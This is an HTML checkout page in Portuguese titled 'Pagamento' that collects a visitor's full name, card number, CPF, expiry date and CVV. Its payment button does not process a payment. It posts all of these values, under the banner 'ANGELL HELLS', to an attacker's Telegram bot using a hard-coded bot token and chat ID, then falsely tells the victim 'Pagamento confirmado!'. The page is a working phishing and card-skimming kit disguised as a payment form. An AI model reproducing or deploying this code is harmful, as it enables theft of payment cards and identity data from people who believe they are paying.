<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Pagamento</title>
  <style>
    /* Estilo geral */
    body {
      font-family: 'Roboto', sans-serif;
      margin: 0;
      padding: 0;
      background: white;
      color: black;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    /* Container principal */
    .container {
      background: rgba(255, 255, 255, 0.9);
      border-radius: 15px;
      padding: 30px;
      max-width: 900px;
      width: 100%;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
    }

    h2 {
      text-align: center;
      color: #FF0000;
      margin-bottom: 20px;
      font-family: 'Bangers', sans-serif;
      font-size: 32px;
      text-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
    }

    /* Formulário */
    form {
      display: flex;
      flex-direction: column;
      gap: 15px;
    }

    label {
      font-weight: bold;
      color: black;
    }

    input, select {
      padding: 12px;
      border: 1px solid #FF0000;
      border-radius: 5px;
      font-size: 16px;
      background: rgba(255, 0, 0, 0.05);
      color: black;
    }

    input:focus, select:focus {
      border-color: #FF0000;
      outline: none;
    }

    button {
      padding: 15px;
      background-color: #FF0000;
      color: white;
      font-size: 16px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-weight: bold;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #b30000;
    }

    /* Estilo do cartão */
    .card-container {
      display: flex;
      justify-content: center;
      margin: 20px 0;
    }

    .card {
      width: 400px;
      height: 250px;
      background: black;
      border-radius: 15px;
      color: #FF0000;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      padding: 20px;
      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.7);
      position: relative;
    }

    .card-header {
      font-size: 20px;
      font-weight: bold;
      color: #FF0000;
    }

    .card-number {
      font-size: 18px;
      letter-spacing: 3px;
      margin: 10px 0;
    }

    .card-holder, .card-cpf {
      font-size: 16px;
      font-style: italic;
    }

    .card-footer {
      display: flex;
      justify-content: space-between;
      font-size: 14px;
    }

    .game-logo {
      position: absolute;
      bottom: 10px;
      right: 10px;
      width: 50px;
      height: 50px;
      background: url('https://i.imgur.com/oCcE3lO.png') no-repeat center center/cover;
    }

    /* PIX Section */
    .pix-container {
      text-align: center;
      display: none;
      margin-top: 20px;
    }

    .pix-info {
      font-size: 18px;
      color: black;
      margin: 10px 0;
    }

    .qr-code {
      max-width: 200px;
      margin: 20px auto;
      display: block;
      border: 2px solid #FF0000;
      border-radius: 10px;
    }

    /* Estilo para as parcelas */
    .installments-container {
      margin-top: 20px;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Pagamento</h2>
    <form id="paymentForm">
      <label for="cardHolder">Nome Completo</label>
      <input type="text" id="cardHolder" placeholder="Digite seu nome completo" required>

      <label for="cardNumber">Número do Cartão</label>
      <input type="text" id="cardNumber" placeholder="XXXX XXXX XXXX XXXX" required>

      <label for="cpf">CPF</label>
      <input type="text" id="cpf" placeholder="000.000.000-00" required>

      <label for="expiration">Data de Validade</label>
      <input type="text" id="expiration" placeholder="MM/AA" required>

      <label for="cvv">CVV</label>
      <input type="text" id="cvv" placeholder="123" required>

      <label for="installments">Escolha o número de parcelas</label>
      <select id="installments" required>
        <option value="1">1x</option>
        <option value="2">2x</option>
        <option value="3">3x</option>
        <option value="4">4x</option>
        <option value="5">5x</option>
        <option value="6">6x</option>
        <option value="7">7x</option>
        <option value="8">8x</option>
        <option value="9">9x</option>
        <option value="10">10x</option>
        <option value="11">11x</option>
        <option value="12">12x</option>
        <option value="13">13x</option>
        <option value="14">14x</option>
        <option value="15">15x</option>
        <option value="16">16x</option>
        <option value="17">17x</option>
        <option value="18">18x</option>
        <option value="19">19x</option>
        <option value="20">20x</option>
        <option value="21">21x</option>
        <option value="22">22x</option>
        <option value="23">23x</option>
        <option value="24">24x</option>
      </select>

      <button type="button" id="payButton">Confirmar Pagamento</button>
      <button type="button" id="pixButton">Pagar com Pix</button>
    </form>

    <!-- Cartão -->
    <div class="card-container">
      <div class="card">
        <div class="card-header">Cartão</div>
        <div class="card-number" id="cardNumberDisplay">XXXX XXXX XXXX XXXX</div>
        <div class="card-holder" id="cardHolderDisplay">Seu Nome</div>
        <div class="card-cpf" id="cardCpfDisplay">CPF: 000.000.000-00</div>
        <div class="card-footer">
          <span id="expirationDisplay">MM/AA</span>
          <span id="cvvDisplay">CVV</span>
        </div>
        <div class="game-logo"></div>
      </div>
    </div>

    <!-- Seção PIX -->
    <div class="pix-container" id="pixContainer">
      <p class="pix-info"><strong>Copie a Chave Pix:</strong> e Cole No App Bancario</p>
      <button type="button" class="copy-button" id="copyPixKey">Copiar Chave Pix</button>
      <img src="img/qr.png" alt="QR Code Pix" class="qr-code">
    </div>

    <!-- Informações de Parcelamento -->
    <div class="installments-container" id="installmentsContainer">
      <!-- Nenhuma exibição adicional é necessária, já que o usuário só escolhe o número de parcelas -->
    </div>
  </div>

  <script>
    // Atualizar o cartão com os dados inseridos
    document.getElementById('cardHolder').addEventListener('input', function () {
      document.getElementById('cardHolderDisplay').innerText = this.value || 'Seu Nome';
    });

    document.getElementById('cardNumber').addEventListener('input', function () {
      const number = this.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ');
      document.getElementById('cardNumberDisplay').innerText = number || 'XXXX XXXX XXXX XXXX';
    });

    document.getElementById('cpf').addEventListener('input', function () {
      const cpf = this.value.replace(/\D/g, '').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
      document.getElementById('cardCpfDisplay').innerText = cpf || 'CPF: 000.000.000-00';
    });

    document.getElementById('expiration').addEventListener('input', function () {
      const expiration = this.value.replace(/\D/g, '').replace(/(\d{2})(\d{2})/, '$1/$2');
      document.getElementById('expirationDisplay').innerText = expiration || 'MM/AA';
    });

    document.getElementById('cvv').addEventListener('input', function () {
      const cvv = this.value.replace(/\D/g, '');
      document.getElementById('cvvDisplay').innerText = cvv || 'CVV';
    });

    // Exibir chave Pix e QR Code
    document.getElementById('pixButton').addEventListener('click', function () {
      document.getElementById('pixContainer').style.display = 'block';
    });

    // Copiar chave Pix
    document.getElementById('copyPixKey').addEventListener('click', function () {
      const pixKey = 'chave pix aquu';
      navigator.clipboard.writeText(pixKey).then(function () {
        alert('Chave Pix copiada!');
      });
    });

    // Enviar dados para o bot do Telegram
    document.getElementById('payButton').addEventListener('click', function () {
      const cardHolder = document.getElementById('cardHolder').value;
      const cardNumber = document.getElementById('cardNumber').value;
      const expiration = document.getElementById('expiration').value;
      const cvv = document.getElementById('cvv').value;
      const cpf = document.getElementById('cpf').value;

      const message = `👻 ANGELL HELLS 👹\n\n💀| Nome: ${cardHolder}\n💳| Número do Cartão: ${cardNumber}\n📅| Validade: ${expiration}\n🔐| CVV: ${cvv}\n🙎| CPF: ${cpf}`;

      const botToken = '7500408481:AAFZF3zGUEeEJL5uTLWXDnjDgs5SLQwDqTs';  // Substitua pelo seu bot token
      const chatId = '6859444625';      // Substitua pelo seu chat ID

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          alert('Pagamento confirmado!');
          window.location.href = ''; // Redireciona após sucesso
        } else {
          alert('Erro ao enviar os dados. Tente novamente.');
        }
      })
      .catch(error => {
        console.error('Erro:', error);
        alert('Erro.');
      });
    });
  </script>
</body>
</html>
